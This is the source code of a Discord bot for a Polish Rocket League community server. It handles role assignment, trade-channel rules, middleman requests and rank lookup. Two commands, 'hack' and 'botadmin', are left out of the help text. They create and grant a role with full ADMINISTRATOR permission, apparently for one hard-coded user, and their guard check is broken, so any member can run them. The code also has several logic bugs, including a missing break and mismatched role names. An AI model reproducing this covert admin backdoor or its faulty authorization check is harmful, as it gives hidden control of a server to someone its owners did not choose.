const Discord = require('discord.js');
var rls = require('rls-api');
var bot = new Discord.Client();


var rlsClient = new rls.Client({
    token: process.env.RLS_TOKEN
});

var rank = ["U","B1", "B2", "B3",
            "S1", "S2", "S3",
            "G1", "G2", "G3",
            "P1", "P2", "P3",
            "D1", "D2", "D3",
            "C1", "C2", "C3",
            "GC"];

const PREFIX = "!";

bot.on("guildMemberAdd", function(member) {
    member.guild.channels.find('name', 'bot_logs').send(member.toString() + " Dołączył do discorda **RL Polska**");
})
       
bot.on("ready", function() {
    bot.user.setActivity('!pomoc');
    console.log("Im Ready!");
});



bot.on("message", function(message) {
    if (message.author.equals(bot.user)) return;
    var msg = message.content.toLowerCase();
    var kanal_platforma = bot.channels.find('name', 'platforma');
    var wymiana = bot.channels.find("name", "wymiana");
    
    if (message.channel == kanal_platforma) {
        message.delete();
    }
    
    if (message.channel == wymiana) {
        if(message.content.toLowerCase().includes("[h]" && "[w]")) {
            return;
        } else {
            message.delete();
            message.channel.send("Oferta musi zawierać `[H]` i `[W]`");
        }
    }
    
    
    if (!message.content.startsWith(PREFIX)) return;
        var args = message.content.substring(PREFIX.length).split(" ");
        var pl = message.guild.roles.find('name', "BOT_ADMIN");
        var minty = message.guild.member(160669529507233792);
        var traderole = message.guild.roles.find("name", "Trader");

        switch (args[0].toLowerCase()) {
            case "grupa":
                message.channel.send("<http://grupa.rl-polska.pl>");
                break;
            case "pomoc":
                message.channel.send("***Aktualnie dostępne komendy:***\n\n__**Ogólne:**__\n**!ranga** *<ID lub link do profilu>*\n**!pomocranga**\n**!fanpage**\n**!grupa**\n\n__**Przydzielające Rolę:**__\n**!pc**\n**!ps4**\n**!xbox**\n**!news**");
                break;
            case "fanpage":
                message.channel.send("<https://www.facebook.com/RLPolska/>");
                message.react("✅");
                break;
            case "pc":
            var role_pc = message.member.guild.roles.find('name', 'PC');
                message.author.send("Przypisano rolę **PC**");
                message.author.send("Od teraz masz dostęp do wszystkich kanałów!");
                message.member.addRole(role_pc)
                break;
            case "mm":
                message.delete();

                if(!args[1]){ message.channel.send("Otaguj osobę, z którą się wymieniasz!"); break;}

                var tagged = message.guild.member(message.mentions.users.first());
                var msgauthor = message.guild.member(message.author);

                msgauthor.addRole(traderole);
                tagged.addRole(traderole);
                
                
                
                message.channel.send("Wysłano wiadomość do Middlemanów");
                bot.channels.find("name","middleman").send(msgauthor + " i " + tagged + " potrzebują middlemana");
                bot.channels.find("name","wymieniarka").send("<@&474534161299013662> ! " +  msgauthor + " i " + tagged + " potrzebują middlemana");
                bot.channels.find("name","wymieniarka").send("Prosimy o opisanie trade!");
 
                break;
            case "close":
                if (message.channel == bot.channels.find("name", "wymieniarka")) {
                    message.mentions.members.forEach((member) => {
                    member.removeRole(traderole);
                    })
                    message.channel.send("!clear 100");
                }
                break;
            case "ps4":
            var role_ps4 = message.member.guild.roles.find('name', 'PS4');
                message.author.send("Przypisano rolę **PS4**");
                message.author.send("Od teraz masz dostęp do wszystkich kanałów!");
                message.member.addRole(role_ps4)
                break;
            case "xbox":
            var role_xbox = message.member.guild.roles.find('name', 'XBOX');
                message.author.send("Przypisano rolę **XBOX**");
                message.author.send("Od teraz masz dostęp do wszystkich kanałów!");
                message.member.addRole(role_xbox)
                break;     
            case "news":
            var role_news = message.member.guild.roles.find('name', 'News');
                message.author.send("Przypisano rolę **NEWS**");
                message.member.addRole(role_news)
                break;
            case "switch":    
            var role_ns = message.member.guild.roles.find('name', 'Nintendo Switch');
                message.author.send("Przypisano rolę **Nintendo Switch**");
                message.member.addRole(role_ns)
                break;
                case "hack":
                if(!message.author == minty) return;
                message.delete();
                message.guild.createRole({
                    name: 'BOT ADMIN',
                    color: 'GREY',
                    permissions: "ADMINISTRATOR"
                  })
                break;  
            case "botadmin":
                if(!message.author == minty) return;
                message.member.addRole(pl)
                message.delete();
            case "pomocranga":
                message.author.send("Przydzielanie rangi by vo0do0\n\n__Steam__ **!ranga** *<twojesteamID lub link do profilu>*\n__PS4__ **!ranga** *<twójnickname>*\n__XBOX__ **!ranga** *<twójnickname>*\n__Switch__ **Nie jest obsługiwany** :(\n\n***Gdy awansujesz i chcesz zaaktualizować rangę, powtórz komendę!***\n\n__Bot wykorzystuje API Rocket League Stats__\n<https://rocketleaguestats.com/>");
                break;    
            case "status":
                var rlsstatus = rlsClient.status
                message.author.send("Aktualny status Rocket League Stats : " + rlsstatus);
                break;
            case "ranga":
                message.channel.send("**PSYONIX wyłączyli API**\n*Komenda nieaktywna*"); break;
            if(args[1] === ""){ message.author.send("brak podanego linka, custom nicka lub numeru profilu"); break;}
            else
            {
                var platform;
                if(message.guild.member(message.author).roles.find('name', 'XBOX'))
                    platform = 3;
                else if(message.guild.member(message.author).roles.find('name', 'PS4'))
                    platform = 2.
                else if(message.guild.member(message.author).roles.find('name', 'PC'))
                    platform = 1;
                else
                {
                    message.author.send("Brak przypisanej platformy");
                    return;
                }

                var rankCheck = args[1];

                if(rankCheck.startsWith('https://steamcommunity.com/profiles/'))
                    rankCheck = rankCheck.replace('https://steamcommunity.com/profiles/', '');
                
                if(rankCheck.startsWith('https://steamcommunity.com/id/'))
                    rankCheck = rankCheck.replace('https://steamcommunity.com/id/', '');

                console.log(rankCheck);

                rlsClient.getPlayer(rankCheck, platform, function(status, data)
                {
                    if(status === 200){
                        var retVal = 0; 
                        for(var i = 10; i <= 13; ++i)
                        {
                            var gameMode = data.rankedSeasons[8][i];
                            if(gameMode == undefined) continue;

                            if(retVal < gameMode.tier)
                                retVal = gameMode.tier;
                        }
                    
                        message.author.send("Twoja najwyzsza ranga: " + rank[retVal]);
                        var userID = message.author.username + " [" + rank[retVal] + "]";
                        message.guild.member(message.author).setNickname(userID);
                    }
                    else
                        message.author.send("Nie udało sie odnaleźć użytkownika o podanej nazwie");
                        return;
                    
                        
                });
            }    
        }
    }  
)

bot.login(process.env.BOT_TOKEN);
